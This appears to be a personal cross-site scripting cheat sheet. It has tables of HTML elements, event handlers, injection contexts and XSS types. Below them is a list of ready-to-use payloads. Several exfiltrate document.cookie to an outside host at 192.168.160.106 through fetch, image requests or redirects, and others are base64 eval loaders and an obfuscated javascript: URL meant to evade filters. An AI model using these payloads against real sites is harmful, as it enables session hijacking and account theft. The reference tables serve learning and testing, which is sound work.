# XSS PAYLOADS

-

# XSS HTML Element Reference

## Auto-Triggered Events

| Element | Common Events | Example |
|----------|---------------|---------|
| `<body>` | `onload` | `<body onload="alert('test')">` |
| `<img>` | `onload`, `onerror` | `<img src="x" onerror="alert('test')">` |
| `<svg>` | `onload` | `<svg onload="alert('test')">` |
| `<iframe>` | `onload` | `<iframe onload="alert('test')">` |
| `<video>` | `onload`, `onerror` | `<video onerror="alert('test')">` |
| `<audio>` | `onload`, `onerror` | `<audio onerror="alert('test')">` |

---

## User Interaction Events

| Element | Common Events | Example |
|----------|---------------|---------|
| `<a>` | `onclick`, `onmouseover` | `<a onclick="alert('test')">Link</a>` |
| `<button>` | `onclick` | `<button onclick="alert('test')">Click</button>` |
| `<div>` | `onclick`, `onmouseover` | `<div onclick="alert('test')">Content</div>` |

---

## Form Events

| Element | Common Events | Example |
|----------|---------------|---------|
| `<input>` | `onfocus`, `onchange` | `<input onfocus="alert('test')">` |
| `<textarea>` | `onfocus`, `onchange` | `<textarea onfocus="alert('test')"></textarea>` |
| `<form>` | `onsubmit` | `<form onsubmit="alert('test')">` |

---

## XSS Contexts

| Context | Example |
|---------|---------|
| HTML | `<div>INPUT</div>` |
| Attribute | `<input value="INPUT">` |
| JavaScript | `<script>INPUT</script>` |
| CSS | `<style>INPUT</style>` |
| URL | `href="INPUT"` / `src="INPUT"` |

---

## XSS Types

| Type | Description |
|------|-------------|
| Reflected | Input is returned immediately in the response |
| Stored | Input is saved and shown to users later |
| DOM-Based | Client-side JavaScript processes the input |


<img src=x onerror="xss_PAYLOAD">
<img src=x onerror="fetch('http://192.168.160.106:8000/test.png')">
<img src=x onerror="window.location='http://192.168.160.106:8000/?cookie='+document.cookie;">
username=<body onload=\"new Image().src='http://192.168.160.106:8080?c='+document.cookie;\">

fetch('http://IP ADDRESS/?c=' + document.cookie)
<svg onload="eval(atob('BASE64 ENCODE PAYLOAD'))">

ENCODED - > base64 playload -> pop up
<a href=ja&#x0D;vascript&colon;\u0065val(\u0061tob("YWxlcnQoInhzcyIp"))>test</a>
